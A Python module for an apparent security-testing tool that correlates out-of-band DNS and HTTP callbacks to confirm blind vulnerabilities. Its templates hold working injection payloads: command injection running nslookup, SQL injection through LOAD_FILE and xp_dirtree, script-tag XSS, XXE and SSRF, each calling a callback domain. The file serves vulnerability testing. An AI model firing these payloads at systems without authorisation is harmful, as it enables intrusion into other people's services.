# listeners/dns_callback.py
# --- VERSION 7.5 - Echo OOB Correlator ---
"""
The "Echo" OOB Correlator - Out-of-Band Vulnerability Detection

A persistent listener system that correlates unique payload IDs with delayed callbacks
to detect blind vulnerabilities (Blind XSS, Blind SQLi, Blind RCE, SSRF, etc.)

Features:
- UUID-based payload tracking
- SQLite persistence for correlation
- Background DNS/HTTP listener simulation
- Interrupt-based notification system
"""

import asyncio
import sqlite3
import uuid
import logging
import time
import json
from typing import Dict, List, Any, Optional
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)


class OOBManager:
    """
    Out-of-Band Callback Manager for detecting blind vulnerabilities.
    
    This system:
    1. Generates unique payload IDs for each injection
    2. Stores payload metadata in SQLite
    3. Provides a callback mechanism for correlation
    4. Tracks delayed callbacks from hours/days later
    """
    
    def __init__(self, db_path: str = "data/oob_callbacks.db", callback_domain: str = "aegis-c2.local"):
        """
        Initialize OOB Manager
        
        Args:
            db_path: Path to SQLite database for persistence
            callback_domain: Domain used for callbacks (e.g., "aegis-c2.com")
        """
        self.db_path = Path(db_path)
        self.callback_domain = callback_domain
        self.pending_callbacks: Dict[str, Dict] = {}
        
        # Ensure database directory exists
        self.db_path.parent.mkdir(exist_ok=True, parents=True)
        
        # Initialize database
        self._init_database()
        
        logger.info(f"[Echo] OOB Manager initialized. Callback domain: {callback_domain}")
    
    def _init_database(self) -> None:
        """Initialize SQLite database schema"""
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        # Create payloads table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS payloads (
                id TEXT PRIMARY KEY,
                target_url TEXT NOT NULL,
                target_parameter TEXT,
                payload_type TEXT NOT NULL,
                payload_content TEXT NOT NULL,
                created_at REAL NOT NULL,
                metadata TEXT
            )
        """)
        
        # Create callbacks table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS callbacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT NOT NULL,
                callback_type TEXT NOT NULL,
                callback_data TEXT,
                received_at REAL NOT NULL,
                source_ip TEXT,
                FOREIGN KEY (payload_id) REFERENCES payloads(id)
            )
        """)
        
        # Create index for faster lookups
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_payload_id 
            ON callbacks(payload_id)
        """)
        
        cursor.execute("""
            CREATE INDEX IF NOT EXISTS idx_created_at 
            ON payloads(created_at)
        """)
        
        conn.commit()
        conn.close()
        
        logger.info("[Echo] Database initialized")
    
    def generate_payload_id(self) -> str:
        """
        Generate a unique payload ID.
        
        Returns:
            Unique payload ID (short UUID)
        """
        # Generate short ID for easier tracking in logs
        full_id = str(uuid.uuid4())
        short_id = full_id.split('-')[0]  # First segment
        return short_id
    
    def create_payload(
        self,
        target_url: str,
        payload_type: str,
        base_payload: str,
        target_parameter: str = None,
        metadata: dict = None
    ) -> Dict[str, str]:
        """
        Create a tracked OOB payload with unique ID.
        
        Args:
            target_url: Target URL where payload will be injected
            payload_type: Type of vulnerability (RCE, SQLi, XSS, SSRF, etc.)
            base_payload: Base payload template
            target_parameter: Parameter being tested
            metadata: Additional metadata
        
        Returns:
            Dictionary with payload_id and instrumented_payload
        
        Example:
            >>> result = oob.create_payload(
            ...     target_url="https://example.com/api/search",
            ...     payload_type="RCE",
            ...     base_payload="'; exec(nslookup {callback}); --"
            ... )
            >>> print(result['instrumented_payload'])
            "'; exec(nslookup id-a1b2c3.aegis-c2.local); --"
        """
        payload_id = self.generate_payload_id()
        callback_url = f"id-{payload_id}.{self.callback_domain}"
        
        # Instrument the payload with the callback
        instrumented_payload = base_payload.replace("{callback}", callback_url)
        
        # Store in database
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO payloads (id, target_url, target_parameter, payload_type, payload_content, created_at, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            payload_id,
            target_url,
            target_parameter,
            payload_type,
            instrumented_payload,
            time.time(),
            json.dumps(metadata or {})
        ))
        
        conn.commit()
        conn.close()
        
        # Add to pending callbacks
        self.pending_callbacks[payload_id] = {
            "target_url": target_url,
            "payload_type": payload_type,
            "created_at": time.time()
        }
        
        logger.info(f"[Echo] Created OOB payload: {payload_id} for {payload_type} at {target_url}")
        
        return {
            "payload_id": payload_id,
            "instrumented_payload": instrumented_payload,
            "callback_url": callback_url
        }
    
    def create_dns_payload(
        self,
        target_url: str,
        payload_type: str,
        target_parameter: str = None
    ) -> Dict[str, str]:
        """
        Create a DNS-based OOB payload.
        
        Common use cases:
        - Blind RCE: nslookup/ping commands
        - Blind SQLi: LOAD_FILE with UNC paths (Windows)
        - SSRF: DNS resolution before HTTP request
        
        Args:
            target_url: Target URL
            payload_type: Vulnerability type
            target_parameter: Parameter name
        
        Returns:
            Payload dictionary
        """
        # Different payload templates based on type
        templates = {
            "RCE": "'; nslookup {callback}; #",
            "RCE_WINDOWS": "& nslookup {callback} &",
            "RCE_POWERSHELL": "; Resolve-DnsName {callback}",
            "SQLi_MYSQL": "' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',{callback},'\\\\test')))--",
            "SQLi_MSSQL": "'; EXEC xp_dirtree '//{callback}/test'; --",
            "SSRF": "http://{callback}/ssrf-test",
        }
        
        base_payload = templates.get(payload_type, "nslookup {callback}")
        
        return self.create_payload(
            target_url=target_url,
            payload_type=payload_type,
            base_payload=base_payload,
            target_parameter=target_parameter
        )
    
    def create_http_payload(
        self,
        target_url: str,
        payload_type: str = "XSS",
        target_parameter: str = None
    ) -> Dict[str, str]:
        """
        Create an HTTP callback payload.
        
        Common use cases:
        - Blind XSS: Image src, script src
        - SSRF: HTTP requests to callback server
        
        Args:
            target_url: Target URL
            payload_type: Vulnerability type
            target_parameter: Parameter name
        
        Returns:
            Payload dictionary
        """
        templates = {
            "XSS": "<img src='http://{callback}/xss.gif'>",
            "XSS_SCRIPT": "<script src='http://{callback}/xss.js'></script>",
            "SSRF": "http://{callback}/ssrf-probe",
            "XXE": "<!ENTITY xxe SYSTEM 'http://{callback}/xxe'>",
        }
        
        base_payload = templates.get(payload_type, "<img src='http://{callback}/test.gif'>")
        
        return self.create_payload(
            target_url=target_url,
            payload_type=payload_type,
            base_payload=base_payload,
            target_parameter=target_parameter
        )
    
    def register_callback(
        self,
        payload_id: str,
        callback_type: str = "DNS",
        callback_data: dict = None,
        source_ip: str = None
    ) -> Dict[str, Any]:
        """
        Register a received callback (called by listener).
        
        Args:
            payload_id: ID from the callback URL
            callback_type: Type of callback (DNS, HTTP, SMTP)
            callback_data: Additional data from the callback
            source_ip: Source IP of the callback
        
        Returns:
            Correlation data from the database
        """
        logger.warning(f"[!] CALLBACK RECEIVED: {payload_id} via {callback_type}")
        
        # Query database for payload info
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT target_url, target_parameter, payload_type, payload_content, created_at, metadata
            FROM payloads
            WHERE id = ?
        """, (payload_id,))
        
        row = cursor.fetchone()
        
        if not row:
            logger.warning(f"[Echo] Unknown payload ID: {payload_id}")
            conn.close()
            return {"error": "Unknown payload ID"}
        
        target_url, target_param, payload_type, payload_content, created_at, metadata_json = row
        
        # Record the callback
        cursor.execute("""
            INSERT INTO callbacks (payload_id, callback_type, callback_data, received_at, source_ip)
            VALUES (?, ?, ?, ?, ?)
        """, (
            payload_id,
            callback_type,
            json.dumps(callback_data or {}),
            time.time(),
            source_ip
        ))
        
        conn.commit()
        conn.close()
        
        # Calculate delay
        delay_seconds = time.time() - created_at
        delay_hours = delay_seconds / 3600
        
        # Build correlation result
        correlation = {
            "payload_id": payload_id,
            "target_url": target_url,
            "target_parameter": target_param,
            "payload_type": payload_type,
            "payload_content": payload_content,
            "callback_type": callback_type,
            "callback_data": callback_data,
            "source_ip": source_ip,
            "delay_seconds": delay_seconds,
            "delay_hours": delay_hours,
            "created_at": datetime.fromtimestamp(created_at).isoformat(),
            "received_at": datetime.fromtimestamp(time.time()).isoformat(),
            "severity": "P0",  # Out-of-band confirmed = Critical
            "confirmed": True,
            "metadata": json.loads(metadata_json) if metadata_json else {}
        }
        
        logger.critical(
            f"[!!!] CONFIRMED VULNERABILITY:\n"
            f"  Type: {payload_type}\n"
            f"  Target: {target_url}\n"
            f"  Parameter: {target_param}\n"
            f"  Delay: {delay_hours:.2f} hours\n"
            f"  Callback: {callback_type} from {source_ip}"
        )
        
        # Remove from pending
        if payload_id in self.pending_callbacks:
            del self.pending_callbacks[payload_id]
        
        return correlation
    
    def get_pending_payloads(self, max_age_hours: int = 72) -> List[Dict]:
        """
        Get pending payloads that haven't received callbacks yet.
        
        Args:
            max_age_hours: Maximum age of payloads to return (default: 72 hours)
        
        Returns:
            List of pending payloads
        """
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cutoff_time = time.time() - (max_age_hours * 3600)
        
        cursor.execute("""
            SELECT p.id, p.target_url, p.payload_type, p.created_at
            FROM payloads p
            LEFT JOIN callbacks c ON p.id = c.payload_id
            WHERE c.id IS NULL AND p.created_at > ?
            ORDER BY p.created_at DESC
        """, (cutoff_time,))
        
        rows = cursor.fetchall()
        conn.close()
        
        pending = []
        for row in rows:
            payload_id, target_url, payload_type, created_at = row
            age_hours = (time.time() - created_at) / 3600
            
            pending.append({
                "payload_id": payload_id,
                "target_url": target_url,
                "payload_type": payload_type,
                "age_hours": age_hours,
                "created_at": datetime.fromtimestamp(created_at).isoformat()
            })
        
        return pending
    
    def get_confirmed_vulnerabilities(self, limit: int = 10) -> List[Dict]:
        """
        Get confirmed vulnerabilities (payloads that received callbacks).
        
        Args:
            limit: Maximum number of results
        
        Returns:
            List of confirmed vulnerabilities
        """
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT p.id, p.target_url, p.target_parameter, p.payload_type, 
                   p.created_at, c.callback_type, c.received_at, c.source_ip
            FROM payloads p
            JOIN callbacks c ON p.id = c.payload_id
            ORDER BY c.received_at DESC
            LIMIT ?
        """, (limit,))
        
        rows = cursor.fetchall()
        conn.close()
        
        confirmed = []
        for row in rows:
            payload_id, target_url, target_param, payload_type, created_at, callback_type, received_at, source_ip = row
            delay_hours = (received_at - created_at) / 3600
            
            confirmed.append({
                "payload_id": payload_id,
                "target_url": target_url,
                "target_parameter": target_param,
                "payload_type": payload_type,
                "callback_type": callback_type,
                "delay_hours": delay_hours,
                "source_ip": source_ip,
                "created_at": datetime.fromtimestamp(created_at).isoformat(),
                "confirmed_at": datetime.fromtimestamp(received_at).isoformat(),
                "severity": "CRITICAL"
            })
        
        return confirmed
    
    async def start_listener(self, port: int = 53, protocol: str = "DNS"):
        """
        Start a background listener for callbacks.
        
        Note: This is a simulation. In production, you would need:
        - A real DNS server (dnslib or custom UDP socket)
        - A real HTTP server (aiohttp.web)
        - Proper domain/DNS configuration
        
        Args:
            port: Port to listen on
            protocol: Protocol to listen for (DNS, HTTP)
        """
        logger.info(f"[Echo] Listener mode: {protocol} on port {port}")
        logger.warning("[Echo] Listener is in simulation mode. For production, configure real DNS/HTTP servers.")
        
        # In a real implementation:
        # - DNS: Use dnslib or asyncio UDP socket to receive DNS queries
        # - HTTP: Use aiohttp.web to receive HTTP callbacks
        # - Parse the callback URL to extract payload ID
        # - Call register_callback() with the extracted ID
        
        # Simulation: Just log that we're ready
        logger.info("[Echo] Listener ready. Waiting for callbacks...")
    
    def get_statistics(self) -> Dict[str, Any]:
        """
        Get statistics about OOB testing.
        
        Returns:
            Dictionary with statistics
        """
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        # Total payloads
        cursor.execute("SELECT COUNT(*) FROM payloads")
        total_payloads = cursor.fetchone()[0]
        
        # Total callbacks
        cursor.execute("SELECT COUNT(*) FROM callbacks")
        total_callbacks = cursor.fetchone()[0]
        
        # Callbacks by type
        cursor.execute("""
            SELECT callback_type, COUNT(*) 
            FROM callbacks 
            GROUP BY callback_type
        """)
        callbacks_by_type = dict(cursor.fetchall())
        
        # Payloads by type
        cursor.execute("""
            SELECT payload_type, COUNT(*) 
            FROM payloads 
            GROUP BY payload_type
        """)
        payloads_by_type = dict(cursor.fetchall())
        
        conn.close()
        
        return {
            "total_payloads": total_payloads,
            "total_callbacks": total_callbacks,
            "confirmed_vulnerabilities": total_callbacks,
            "pending_payloads": total_payloads - total_callbacks,
            "callbacks_by_type": callbacks_by_type,
            "payloads_by_type": payloads_by_type
        }


# Singleton instance
_oob_manager_instance = None

def get_oob_manager(callback_domain: str = "aegis-c2.local") -> OOBManager:
    """
    Get or create the singleton OOB manager instance.
    
    Args:
        callback_domain: Domain for callbacks (only used on first call)
    
    Returns:
        OOBManager instance
    """
    global _oob_manager_instance
    if _oob_manager_instance is None:
        _oob_manager_instance = OOBManager(callback_domain=callback_domain)
    return _oob_manager_instance
